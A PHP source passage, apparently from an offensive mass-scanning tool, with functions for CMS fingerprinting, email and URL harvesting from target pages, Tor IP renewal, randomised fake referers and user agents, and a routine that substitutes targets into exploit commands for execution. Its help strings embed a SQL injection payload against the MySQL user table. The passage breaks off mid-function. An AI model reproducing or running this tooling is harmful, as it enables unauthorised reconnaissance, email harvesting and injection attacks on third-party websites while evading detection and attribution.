        __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}INCORRECT FORMAT! / Format TYPE_EXPLOIT::EXPLOIT_COMMAND / ex: NMAP::nmap -sV _TARGET_\n");
    }
}

################################################################################
#CHECK CMS######################################################################

function __SimpleCheckCMS($html) {

    $cms['XOOPS CMS IDENTIFIED'] = '<meta name="generator" content="XOOPS"';
    $cms['Joomla CMS IDENTIFIED'] = '<meta name="generator" content="Joomla!';
    $cms['Wordpress CMS IDENTIFIED'] = '<meta name="generator" content="WordPress';
    $cms['SMF CMS IDENTIFIED-1'] = '<a href="http://www.simplemachines.org/" title="Simple Machines Forum" target="_blank">Powered by SMF';
    $cms['SMF CMS IDENTIFIED-2'] = '<a href="http://www.simplemachines.org/about/copyright.php" title="Free Forum Software" target="_blank">SMF';
    $cms['vBulletin CMS IDENTIFIED-1'] = '<meta name="generator" content="vBulletin';
    $cms['vBulletin CMS IDENTIFIED-2'] = 'Powered by <a href="http://www.vbulletin.com" id="vbulletinlink">vBulletin&trade;</a> Version';
    $cms['vBulletin CMS IDENTIFIED-3'] = 'powered by vBulletin';
    $cms['phpBB CMS IDENTIFIED'] = 'Powered by <a href="http://www.phpbb.com/">phpBB</a>';
    $cms['MyBB CMS IDENTIFIED'] = 'Powered By <a href="http://www.mybboard.net" target="_blank">MyBB</a>';
    $cms['Drupal CMS IDENTIFIED-1'] = 'name="Generator" content="Drupal';
    $cms['Drupal CMS IDENTIFIED-2'] = 'Drupal.settings';
    $cms['MODx CMS IDENTIFIED'] = '<a href="http://www.modx.com" target="_blank"> Powered by MODx</a>';
    $cms['SilverStripe CMS IDENTIFIED'] = '<meta name="generator" content="SilverStripe - http://silverstripe.org" />';
    $cms['Textpattern CMS IDENTIFIED'] = 'Powered by <a href="http://www.textpattern.com" title="Textpattern">Textpattern</a>';
    $cms['Adapt CMS IDENTIFIED'] = 'Powered by <a href="http://www.adaptcms.com">AdaptCMS';
    $cms['ATutor CMS IDENTIFIED'] = '<a href="/about.php">About ATutor</a>';
    $cms['b2evolution CMS IDENTIFIED'] = '<meta name="generator" content="b2evolution';
    $cms['Moodle CMS IDENTIFIED-1'] = 'Powered by <a href="http://moodle.org" title="Moodle">Moodle</a>';
    $cms['Moodle CMS IDENTIFIED-2 '] = '<meta name="key words" content="moodle, Course Management System " />';
    $cms['Moodle CMS IDENTIFIED-3'] = '://moodle';
    $cms['Moodle CMS IDENTIFIED-4'] = '://www.mood le';
    $cms['ATutor CMS IDENTIFIED'] = '<META NAME="GENERATOR" CONTENT="PHP-Nuke';
    $cms['PostNuke CMS IDENTIFIED'] = '<meta name="generator" content="PostNuke';
    $cms['CloudFlare IDENTIFIED-1'] = '<a href="http://www.cloudflare.com/" target="_blank" style=';
    $cms['CloudFlare IDENTIFIED-2'] = 'DDoS protection by CloudFlare</a>';

    foreach ($cms as $campo => $valor) {

        __plus();
        if (strstr($html, $cms[$campo])) {
            return(" {$campo} ");
        }
    }
    return "0xUNIDENTIFIED";
}

################################################################################
#REPLACE THE SECURITIES URL#####################################################

function __replace($exploit, $url) {

    $exploit_ = strstr($_SESSION['config']['replace'], '[INURL]') ? $exploit : __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}DEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}\n");
    $exploit = explode("[INURL]", $exploit_);
    $exploit[0] = (isset($exploit[0]) && !is_null($exploit[0])) ? $exploit[0] : __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}DEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}\n");
    $exploit[1] = (isset($exploit[0]) && !is_null($exploit[1])) ? $exploit[1] : __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}DEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}\n");
    return str_replace($exploit[0], $exploit[1], $url);
}

################################################################################
#VALID MENU OPTIONS#############################################################

function __validateOptions($opArray, $validar, $op = NULL) {

    if (empty($validar) || empty($opArray)) {
        return FALSE;
    }

    $array = explode(',', $opArray);
    if (is_null($op)) {
        $busca = explode(',', $validar);
        for ($i = 0; $i <= count($busca); $i++) {
            if (in_array($busca[$i], $array)) {
                return TRUE;
            }
        }
    } else {
        for ($i = 0; $i <= count($array); $i++) {
            if (strstr($validar, $array[$i])) {
                return TRUE;
            }
        }
    }
    return FALSE;
}

################################################################################
#VALIDATE OPERATING SYSTEM AND COLOR SYSTEM#####################################

function __OS() {

    $sistema = strtoupper(PHP_OS);
    if (substr($sistema, 0, 3) == "WIN") {
        $i = 0;
        system("cls");
        $_SESSION["os"] = 1;
        while ($i <= 17) {
            $_SESSION["c{$i}"] = NULL;
            $i++;
        }
    } else {
        system("command clear");
        //DEFINING COLORS
        $_SESSION["c0"] = "\033[0m";      // END OF COLOR
        $_SESSION["c1"] = "\033[1;37m";   // WHITE
        $_SESSION["c2"] = "\033[1;33m";   // YELLOW
        $_SESSION["c3"] = "\033[1;31m";   // RED LIGHT
        $_SESSION["c4"] = "\033[0;32m";   // GREEN
        $_SESSION["c5"] = "\033[1;32m";   // GREEN LIGHT
        $_SESSION["c6"] = "\033[0;35m";   // PURPLE
        $_SESSION["c7"] = "\033[1;30m";   // DARK GREY
        $_SESSION["c8"] = "\033[0;34m";   // BLUE
        $_SESSION["c9"] = "\033[0;37m";   // LIGHT GREY
        $_SESSION["c10"] = "\033[0;33m";  // BROWN
        $_SESSION["c11"] = "\033[1;35m";  // LIGHT PURPLE
        $_SESSION["c12"] = "\033[0;31m";  // RED
        $_SESSION["c13"] = "\033[1;36m";  // LIGHT CYAN
        $_SESSION["c14"] = "\033[0;36m";  // CIANO
        $_SESSION["c15"] = "\033[1;34m";  // LIGHT BLUE
        $_SESSION["c16"] = "\033[02;31m"; // DARK RED
    }
}

################################################################################
#SAVE URL VULNERABLE  COMMAND ECHO >> FILE######################################

function __saveValue($arquivo, $valor, $op = NULL) {

    echo ($op == 1) ? "\n{$_SESSION["c1"]}|_[ + ]{$_SESSION["c7"]} VALUE SAVED IN THE FILE::{$_SESSION["c9"]} {$arquivo}{$_SESSION["c0"]}" : NULL;
    file_put_contents(($op == 2) ? $arquivo : $_SESSION['config']['out_put_paste'] . $arquivo, "{$valor}\n", FILE_APPEND);
}

################################################################################
#CAPTURE ID KEY TO SEARCH LYCOS MAKE############################################

function __getIdSearchLycos($html) {

    $match = NULL;
    preg_match_all("(val.*)", $html, $match);
    return (str_replace(');', '', str_replace('val(', '', str_replace("'", '', $match[0][4]))));
}

################################################################################
#RENEW IP NETWORK TOR###########################################################

function __renewTOR() {

    system("[ -z 'pidof tor' ] || pidof tor | xargs sudo kill -HUP;");
    $request__ = __request_info($curl = curl_init(), 'http://dynupdate.no-ip.com/ip.php', $_SESSION["config"]["proxy"]);
    __plus();
    echo "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ IP NETWORK TOR RENEWED ]::: {$_SESSION["c1"]}[ {$request__['corpo'] } ]\n{$_SESSION["c0"]}";
    /* https://pt.wikipedia.org/wiki/Pidof
     * pidof é um utilitário Linux que encontra o ID de um programa em execução.
     * Note que o próprio nome é a junção dos termos pid, que significa identidade
     * de um processo e of que significa de. Portanto pidof quer dizer identidade 
     * de processo de...
     * O equivalente no Solaris é pgrep. pidof firefox-bin O commando acima retorna 
     * o pid do processo que está executando firefox-bin.
     * Pode-se combinar o commando 'pidof' com o commando kill dessa forma:
     * kill -9 $(pidof firefox-bin) pidof é simplesmente uma ligação simbólica 
     * para o programa killall5,que está localizado em /sbin.
     */
}

################################################################################
#This function will validate emails#############################################

function __validateEmail($email) {

    $conta = "^[a-zA-Z0-9\._-]+@";
    $domino = "[a-zA-Z0-9\._-]+.";
    $extensao = "([a-zA-Z]{2,4})$";

    $pattern = $conta . $domino . $extensao;

    return (ereg($pattern, $email)) ? TRUE : FALSE;
}

################################################################################
#This function will validate URLS###############################################

function __validateURL($url) {

    if (preg_match("#\b(http[s]?://|ftp[s]?://){1,}?([-a-zA-Z0-9\.]+)([-a-zA-Z0-9\.]){1,}([-a-zA-Z0-9_\.\#\@\:%_/\?\=\~\-\//\!\'\(\)\s\^\:blank:\:punct:\:xdigit:\:space:\$]+)#si", $url)) {
        return TRUE;
    } else {
        return FALSE;
    }
}

################################################################################
#This function will filter custom values########################################

function __extractRegCustom($html, $url_) {

    $matches = NULL;
    __plus();
    preg_match_all("#\b{$_SESSION['config']['regexp-filter']}#i", $html, $matches);

    echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}\n";
    echo "{$_SESSION["c1"]} |_0xURL {$_SESSION["c0"]}=>{$_SESSION["c9"]} {$url_} {$_SESSION["c0"]}\n";

    $matches_ = array_filter(array_unique(array_unique($matches[0])));
    foreach ($matches_ as $valor) {

        if (not_isnull_empty($valor)) {

            echo "{$_SESSION["c1"]}__[ + ] {$_SESSION["c0"]}[\033[01;31m {$_SESSION['config']['cont_valores']} {$_SESSION["c0"]}]- {$valor}\n";
            $_SESSION["config"]["resultado_valores"].="{$valor}\n";
            __plus();
            __saveValue($_SESSION["config"]["arquivo_output"], $valor);
            $_SESSION['config']['cont_valores'] ++;
        }
        __plus();
    }
    __timeSec('delay', "\n");
}

################################################################################
#This function will filter and mail each url####################################

function __extractEmail($html, $url_) {

    $matches = NULL;
    __plus();
    preg_match_all('/([\w\d\.\-\_]+)@([\w\d\.\_\-]+)/mi', $html, $matches);
    echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}\n";
    echo "{$_SESSION["c1"]} |_0xURL {$_SESSION["c0"]}=>{$_SESSION["c9"]} {$url_} {$_SESSION["c0"]}\n";

    $matches_ = array_filter(array_unique(array_unique($matches[0])));
    foreach ($matches_ as $valor) {

        if (__validateEmail($valor)) {

            echo "{$_SESSION["c1"]}|_[ + ]{$_SESSION["c0"]}[\033[01;31m {$_SESSION['config']['cont_valores']} {$_SESSION["c0"]}]- {$valor} " . (filter_var($valor, FILTER_VALIDATE_EMAIL) ? "{$_SESSION["c14"]}[ OK ]{$_SESSION["c0"]}" : "{$_SESSION["c16"]}[ NO ]{$_SESSION["c0"]}") . "\n";
            (filter_var($valor, FILTER_VALIDATE_EMAIL) ? $_SESSION["config"]["resultado_valores"].="{$valor}\n" : NULL);
            __plus();
            (filter_var($valor, FILTER_VALIDATE_EMAIL) ? __saveValue($_SESSION["config"]["arquivo_output"], $valor) : NULL);

            $_SESSION['config']['cont_valores'] ++;
        }
        __plus();
    }
    __timeSec('delay', "\n");
}

################################################################################
#This function will filter urls each url########################################

function __extractURLs($html, $url_) {

    $matches = NULL;
    __plus();
    $reg_tag = 'href=\"|src=\"|value=\"';
    $reg = "#\b({$reg_tag}http[s]?://|{$reg_tag}ftp[s]?://){1,}?([-a-zA-Z0-9\.]+)([-a-zA-Z0-9\.]){1,}([-a-zA-Z0-9_\.\#\@\:%_/\?\=\~\-\//\!\'\(\)\s\^\:blank:\:punct:\:xdigit:\:space:\$]+)#si";
    preg_match_all($reg, $html, $matches);
    echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}\n";
    echo "{$_SESSION["c1"]} |_[ INFO ][URL] {$_SESSION["c0"]}=>{$_SESSION["c9"]} {$url_} {$_SESSION["c0"]}\n";
    echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}\n";
    $matches_ = array_unique(array_filter($matches[0]));
    $blacklist = $_SESSION["config"]['blacklist'];
    $blacklist_ = (isset($_SESSION["config"]["webcache"])) ? str_replace('webcache.,', '', $blacklist) : $blacklist;

    foreach ($matches_ as $valor) {

        $valor = __filterURLTAG($valor);
        if (__validateURL($valor) && !__validateOptions($blacklist_, $valor, 1)) {
            echo "{$_SESSION["c1"]}__[ + ]{$_SESSION["c0"]}[\033[01;31m {$_SESSION["config"]['cont_url']} {$_SESSION["c9"]}]- {$valor}{$_SESSION["c0"]}\n";
            $_SESSION["config"]["resultado_valores"].="{$valor}\n";
            __plus();
            __saveValue($_SESSION["config"]["arquivo_output"], $valor) . __plus();
            $_SESSION["config"]["cont_url"] ++;
        }
        __plus();
    }
    __timeSec('delay', "\n");
}

################################################################################
#This function removes the last regular expression ta###########################

function __filterURLTAG($valor = NULL) {

    return(!is_null($valor)) ? str_replace('href="', '', str_replace('src="', '', str_replace('value="', '', $valor))) : NULL;
}

################################################################################
#Esta função irá formatar salvar urls concatenadas##############################

function __checkURLs($resultado, $url_) {

    __plus();
    $code = !is_null($_SESSION["config"]["ifcode"]) ? $_SESSION["config"]["ifcode"] : 200;
    $valor = ($resultado == $code) ? "{$_SESSION["c4"]}" : NULL;
    echo "\n{$_SESSION["c1"]}  |_[ INFO ]{$_SESSION["c0"]}[{$_SESSION["c1"]} {$_SESSION['config']['cont_valores']} {$_SESSION["c0"]}]\n";
    echo "{$_SESSION["c1"]}  |_[ INFO ][URL] {$_SESSION["c0"]}::{$_SESSION["c9"]}{$valor} {$url_} {$_SESSION["c0"]}\n";
    echo "{$_SESSION["c1"]}  |_[ INFO ][STATUS]::{$valor} {$resultado} {$_SESSION["c0"]}\n";
    __timeSec('delay');
    echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}";
    __plus();

    if ($resultado == $code) {
        $_SESSION['config']['resultado_valores'].= "{$url_}\n";
        __saveValue($_SESSION["config"]["arquivo_output"], $url_) . __plus();
    }

    $_SESSION['config']['cont_valores'] ++;

    __plus();
}

################################################################################
#This function will send the contents of the output buffer (if any)#############

function __plus() {

    ob_flush();
    flush();
}

################################################################################
#FORMATTING POST################################################################

function __convertUrlQuery($query) {

    $queryParts = explode('&', $query);
    $params = array();
    foreach ($queryParts as $param) {
        $item = explode('=', $param) . __plus();
        $params[$item[0]] = urlencode($item[1]);
    }

    return $params;
}

################################################################################
#OPEN FILE BASE FOR VALIDATION##################################################

function __openFile($arquivo, $op = NULL) {

    if (isset($arquivo) && !empty($arquivo)) {
        $resultadoURL = array_unique(array_filter(explode("\n", file_get_contents($arquivo))));

        if (is_array($resultadoURL)) {

            return ($op == 1 ? $resultadoURL : __process($resultadoURL));
        }
    }
}

################################################################################
#CATCH INFORMATION IP###########################################################

function __infoIP($ip, $op = 0) {

    /*
      [longitude] => 4.9
      [latitude] => 52.3667
      [asn] => AS196752
      [offset] => 2
      [ip] => 46.19.37.0
      [area_code] => 0
      [continent_code] => EU
      [dma_code] => 0
      [timezone] => Europe/Amsterdam
      [country_code] => NL
      [isp] => Tilaa B.V.
      [country] => Netherlands
      [country_code3] => NLD
     */

    preg_match_all('#\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})#si', $ip, $ip);
    if (filter_var($ip[0][0], FILTER_VALIDATE_IP)) {
        if ($op == 0) {
            $request__ = __request_info($curl = curl_init(), "http://www.telize.com/geoip/{$ip[0][0]}", $_SESSION["config"]["proxy"], NULL);
            __plus();
            return json_decode($request__['corpo'], TRUE);
        } else {
            $_SESSION['config']['verifica_info'] = NULL;
            $request__ = __request_info($curl = curl_init(), "http://www.telize.com/geoip/{$ip[0][0]}", $_SESSION["config"]["proxy"], NULL);
            $return = json_decode($request__['corpo'], TRUE);
            __plus();
            return "{$return['city']} /{$return['country']} - {$return['country_code']} /{$return['continent_code']} , ISP: {$return['isp']}";
        }
    }
}

################################################################################
#CAPTURE URL POSITION IN BROWSER ALEXA / RELEVANCE OF SUCH URL##################

function __positionAlexa($url) {

    $xmlSimple = simplexml_load_file("http://data.alexa.com/data?cli=10&dat=snbamz&url={$url}");
    $resultRank = $xmlSimple->SD[1];
    __plus();
    if ($resultRank) {
        $retornoRank = $resultRank->REACH->attributes()->RANK;
    } else {
        $retornoRank = 0;
    }
    return $retornoRank . __plus();
}

################################################################################
#GENERATE URL REFERENCE random##################################################

function __setURLReferenceRandom() {

    $dominio = array('Adzuna', 'Bixee', 'CareerBuilder', 'Craigslist', 'Dice', 'Eluta.ca', 'Hotjobs', 'JobStreet', 'Incruit', 'Indeed', 'Glassdoor', 'LinkUp', 'Monster', 'Naukri',
        'Yahoo', 'Legal', 'GoogleScholar', 'Lexis', 'Manupatra', 'Quicklaw', 'WestLaw', 'Medical', 'Bing Health', 'Bioinformatic', 'CiteAb', 'EB-eye', 'Entrez', 'mtv', 'ubuntu',
        'GenieKnows', 'GoPubMed', 'Healia', 'Healthline', 'Nextbio', 'PubGene', 'Quertle', 'Searchmedica', 'WebMD', 'News', 'BingNews', 'Daylife', 'GoogleNews', 'aol', 'microsoft',
        'MagPortal', 'Newslookup', 'Nexis', 'Topix', 'Trapit', 'YahooNews', 'People', 'Comfibook', 'Ex.plode', 'InfoSpace', 'PeekYou', 'Spock', 'Spokeo', 'WorldwideHelpers', 'iPhone',
        'Zabasearch', 'ZoomInfo', 'Fizber', 'HotPads', 'Realtor', 'Redfin', 'Rightmove', 'Trulia', 'Zillow', 'Zoopla', 'StuRents', 'globo', 'sbt', 'band', 'cnn', 'blog.inurl.com.br'
    );

    $gTLD = array('aero', 'arpa', 'biz', 'com', 'coop', 'edu', 'gov', 'info', 'int', 'mil', 'museum', 'name', 'net', 'org', 'pro', 'tel');

    $arquivo = array('admin', 'index', 'wp-admin', 'info', 'shop', 'file', 'out', 'open', 'news', 'add', 'profile', 'search', 'open', 'photo', 'insert', 'view');
    $ext = array('exe', 'php', 'asp', 'aspx', 'jsf', 'html', 'htm', 'lua', 'log', 'cgi', 'sh', 'css', 'py', 'sql', 'xml', 'rss');

    $pasta = array('App_Files', 'Assets', 'CFFileServlet', 'CFIDE', 'Communication', 'Computers', 'CoreAdminHome', 'CoreHome', 'Crawler', 'Creator',
        'DECOM', 'Dashboard', 'Drives', 'Dynamic', 'FCKeditor', 'Feedback', 'Files', 'Flash', 'Forms', 'Help', 'ICEcore', 'IO', 'Image', 'JPG', 'getold',
        'JSP', 'KFSI', 'Laguna', 'Login', 'Motors', 'MultiSites', 'NR', 'OCodger', 'RSS', 'Safety', 'Smarty', 'Software', 'Static', 'Stress', 'getfull',
        'Sugarcrm', 'Travel', 'UPLOAD', 'Urussanga', 'UserFiles', '__tpl', '_fckeditor', '_info', '_machine', '_plugins', '_sample', '_samples', 'postmost',
        '_source', '_testcases', 'aaa', 'abelardoluz', 'aberlardoluz', 'aborto', 'about', 'aboutus', 'abuse', 'abusers', 'ac_drives', 'acabamentos', 'mail',
        'academias', 'acao', 'acartpro', 'acatalog', 'acc', 'acc_auto_del', 'acc_beep_ken', 'acc_beep_time', 'acc_ch_mail', 'acc_fc_prsc', 'accounts', 'validar',
        'acc_html_mark', 'acc_html_rand', 'acc_lan_page', 'acc_pic_html', 'acc_profol', 'acc_soft_link', 'acc_ssd_page', 'acc_syun_ei', 'german', 'intranet', 'old',
        'acc_time_go', 'acc_wbcreator', 'accept', 'accepted', 'acceso', 'access', 'accessibility', 'accessories', 'acciones', 'acclg', 'account', 'paste', 'paste22',
        'acessorios', 'acontece', 'acougueiro', 'acoustic', 'act', 'action', 'activate', 'active', 'activeden', 'activism', 'actualit', 'actuators', 'ad', 'informatica',
        'ad_division', 'ad_rate', 'adapter', 'adapters', 'adaptive', 'adaptivei', 'adatmentes', 'adbanner', 'adblock', 'adboard', 'adclick', 'add-ons', 'add', 'delete',
        'added', 'addon', 'address', 'adduser', 'adfree', 'adhoc', 'adinfo', 'adios_papa', 'adlink', 'adlinks', 'acc_folder_vw', 'acc_syun_su',
    );

    $locais = array('ac', 'ad', 'ae', 'af', 'ag', 'al', 'am', 'an', 'ao', 'aq', 'ar', 'as', 'at', 'au', 'aw', 'az', 'ba', 'bb', 'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'bj', 'bm', 'bn',
        'bw', 'by', 'bz', 'ca', 'cc', 'cd', 'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'cr', 'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do', 'dz', 'bo', 'br',
        'ec', 'ee', 'eg', 'er', 'es', 'et', 'eu', 'fi', 'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf', 'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gp', 'gq', 'gr', 'bs', 'bt',
        'gs', 'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu', 'id', 'ie', 'il', 'im', 'in', 'io', 'iq', 'ir', 'is', 'it', 'je', 'jm', 'jo', 'jp', 'ke', 'kg', 'bv',
        'kh', 'ki', 'km', 'kn', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk', 'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me', 'mg', 'mh', 'mk', 'ml',
        'mm', 'mn', 'mo', 'mp', 'mq', 'mr', 'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'nb', 'nc', 'ne', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz', 'om',
        'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn', 'pr', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'ru', 'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si',
        'sj', 'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'ss', 'st', 'su', 'sv', 'sy', 'sz', 'tc', 'td', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm', 'tn', 'to', 'tr', 'tt', 'tv',
        'tw', 'tz', 'ua', 'ug', 'uk', 'um', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi', 'vn', 'vu', 'wf', 'ws', 'ye', 'yt', 'yu', 'za', 'zm', 'zw', 'ai',
    );
    return "http://www." . strtolower($dominio[rand(0, count($dominio) - 1)]) . ".{$gTLD[rand(0, count($gTLD) - 1)]}.{$locais[rand(0, count($locais) - 1)]}/{$pasta[rand(0, count($pasta) - 1)]}/{$arquivo[rand(0, count($arquivo) - 1)]}.{$ext[rand(0, count($ext) - 1)]}";
}

################################################################################
#GENERATE AGENT BROWSER random##################################################

function __setUserAgentRandom() {

    $agentBrowser = array('Firefox', 'Safari', 'Opera', 'Flock', 'Internet Explorer', 'Seamonkey', 'Tor Browser', 'GNU IceCat', 'CriOS', 'TenFourFox',
        'SeaMonkey', 'B-l-i-t-z-B-O-T', 'Konqueror', 'Mobile', 'Konqueror', 'Netscape', 'Chrome', 'Dragon', 'SeaMonkey', 'Maxthon', 'IBrowse',
        'K-Meleon', 'GoogleBot', 'Konqueror', 'Minimo', 'Googlebot', 'WeltweitimnetzBrowser', 'SuperBot', 'TerrawizBot', 'YodaoBot', 'Wyzo', 'Grail',
        'PycURL', 'Galaxy', 'EnigmaFox', '008', 'ABACHOBot', 'Bimbot', 'Covario IDS', 'iCab', 'KKman', 'Oregano', 'WorldWideWeb', 'Wyzo', 'GNU IceCat',
        'Vimprobable', 'uzbl', 'Slim Browser', 'Flock', 'OmniWeb', 'Rockmelt', 'Shiira', 'Swift', 'Pale Moon', 'Camino', 'Flock', 'Galeon', 'Sylera'
    );

    $agentSistema = array('Windows 3.1', 'Windows 95', 'Windows 98', 'Windows 2000', 'Windows NT', 'Linux 2.4.22-10mdk', 'FreeBSD',
        'Windows XP', 'Windows Vista', 'Redhat Linux', 'Ubuntu', 'Fedora', 'AmigaOS', 'BackTrack Linux', 'iPad', 'BlackBerry', 'Unix',
        'CentOS Linux', 'Debian Linux', 'Macintosh', 'Android', 'iPhone', 'Windows NT 6.1', 'BeOS', 'OS 10.5', 'Nokia', 'Arch Linux',
        'Ark Linux', 'BitLinux', 'Conectiva (Mandriva)', 'CRUX Linux', 'Damn Small Linux', 'DeLi Linux', 'Ubuntu', 'BigLinux', 'Edubuntu',
        'Fluxbuntu', 'Freespire', 'GNewSense', 'Gobuntu', 'gOS', 'Mint Linux', 'Kubuntu', 'Xubuntu', 'ZeVenOS', 'Zebuntu', 'DemoLinux',
        'Dreamlinux', 'DualOS', 'eLearnix', 'Feather Linux', 'Famelix', 'FeniX', 'Gentoo', 'GoboLinux', 'GNUstep', 'Insigne Linux',
        'Kalango', 'KateOS', 'Knoppix', 'Kurumin', 'Dizinha', 'TupiServer', 'Linspire', 'Litrix', 'Mandrake', 'Mandriva', 'MEPIS',
        'Musix GNU Linux', 'Musix-BR', 'OneBase Go', 'openSuSE', 'pQui Linux', 'PCLinuxOS', 'Plaszma OS', 'Puppy Linux', 'QiLinux',
        'Red Hat Linux', 'Red Hat Enterprise Linux', 'CentOS', 'Fedora', 'Resulinux', 'Rxart', 'Sabayon Linux', 'SAM Desktop', 'Satux',
        'Slackware', 'GoblinX', 'Slax', 'Zenwalk', 'SuSE', 'Caixa Mágica', 'HP-UX', 'IRIX', 'OSF/1', 'OS-9', 'POSYS', 'QNX', 'Solaris',
        'OpenSolaris', 'SunOS', 'SCO UNIX', 'Tropix', 'EROS', 'Tru64', 'Digital UNIX', 'Ultrix', 'UniCOS', 'UNIflex', 'Microsoft Xenix',
        'z/OS', 'Xinu', 'Research Unix', 'InfernoOS'
    );

    $locais = array('cs-CZ', 'en-US', 'sk-SK', 'pt-BR', 'sq_AL', 'sq', 'ar_DZ', 'ar_BH', 'ar_EG', 'ar_IQ', 'ar_JO',
        'ar_KW', 'ar_LB', 'ar_LY', 'ar_MA', 'ar_OM', 'ar_QA', 'ar_SA', 'ar_SD', 'ar_SY', 'ar_TN', 'ar_AE', 'ar_YE', 'ar',
        'be_BY', 'be', 'bg_BG', 'bg', 'ca_ES', 'ca', 'zh_CN', 'zh_HK', 'zh_SG', 'zh_TW', 'zh', 'hr_HR', 'hr', 'cs_CZ', 'cs',
        'da_DK', 'da', 'nl_BE', 'nl_NL', 'nl', 'en_AU', 'en_CA', 'en_IN', 'en_IE', 'en_MT', 'en_NZ', 'en_PH', 'en_SG', 'en_ZA',
        'en_GB', 'en_US', 'en', 'et_EE', 'et', 'fi_FI', 'fi', 'fr_BE', 'fr_CA', 'fr_FR', 'fr_LU', 'fr_CH', 'fr', 'de_AT', 'de_DE',
        'de_LU', 'de_CH', 'de', 'el_CY', 'el_GR', 'el', 'iw_IL', 'iw', 'hi_IN', 'hu_HU', 'hu', 'is_IS', 'is', 'in_ID', 'in', 'ga_IE',
        'ga', 'it_IT', 'it_CH', 'it', 'ja_JP', 'ja_JP_JP', 'ja', 'ko_KR', 'ko', 'lv_LV', 'lv', 'lt_LT', 'lt', 'mk_MK', 'mk', 'ms_MY',
        'ms', 'mt_MT', 'mt', 'no_NO', 'no_NO_NY', 'no', 'pl_PL', 'pl', 'pt_PT', 'pt', 'ro_RO', 'ro', 'ru_RU', 'ru', 'sr_BA', 'sr_ME',
        'sr_CS', 'sr_RS', 'sr', 'sk_SK', 'sk', 'sl_SI', 'sl', 'es_AR', 'es_BO', 'es_CL', 'es_CO', 'es_CR', 'es_DO', 'es_EC', 'es_SV',
        'es_GT', 'es_HN', 'es_MX', 'es_NI', 'es_PA', 'es_PY', 'es_PE', 'es_PR', 'es_ES', 'es_US', 'es_UY', 'es_VE', 'es', 'sv_SE',
        'sv', 'th_TH', 'th_TH_TH', 'th', 'tr_TR', 'tr', 'uk_UA', 'uk', 'vi_VN', 'vi'
    );
    return $agentBrowser[rand(0, count($agentBrowser) - 1)] . '/' . rand(1, 20) . '.' . rand(0, 20) . ' (' . $agentSistema[rand(0, count($agentSistema) - 1)] . ' ' . rand(1, 7) . '.' . rand(0, 9) . '; ' . $locais[rand(0, count($locais) - 1)] . ';)';
}

################################################################################
#RESPONSIBLE FOR RUN COMMANDS IN TERMINAL the installation of facilities########

function __installDepencia() {
    echo __bannerlogo() . __plus();
    echo "\n{$_SESSION["c15"]}|_[ * ]__{$_SESSION["c0"]}\n";
    echo "         {$_SESSION["c15"]}|[EXTERNAL COMMAND INSTALLING PREMISES ]:: {$_SESSION["c11"]}\n";
    $dados = system("sudo apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl", $dados) . __plus();
    sleep(1) . __plus();
    echo "{$_SESSION["c0"]}";
    if (empty($dados)) {
        return FALSE;
    }
    unset($dados);
    exit();
}

################################################################################
#RESPONSIBLE FOR RUN COMMANDS IN TERMINAL#######################################

function __command($commando, $alvo) {

    if (!is_null($commando)) {

        (strstr($commando, '_TARGET_') || strstr($commando, '_TARGETFULL_') || strstr($commando, '_TARGETIP_') || strstr($commando, '_EXPLOIT_') ? NULL : __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c2"]}SET PARAMETER - command correctly{$_SESSION["c0"]}\n"));

        $commandoCor = str_replace("_TARGET_", "{$_SESSION["c8"]}" . __filterHostname($alvo) . "{$_SESSION["c15"]}", $commando);
        $commandoCor = str_replace('_TARGETIP_', "{$_SESSION["c9"]}{$_SESSION['config']['server_ip']}{$_SESSION["c15"]}", $commandoCor);
        $commandoCor = str_replace('_TARGETFULL_', "{$_SESSION["c14"]}{$alvo}{$_SESSION["c15"]}", $commandoCor);
        $commandoCor = str_replace("_EXPLOIT_", "{$_SESSION["c6"]}{$_SESSION['config']['exploit-command']}{$_SESSION["c15"]}", $commandoCor);

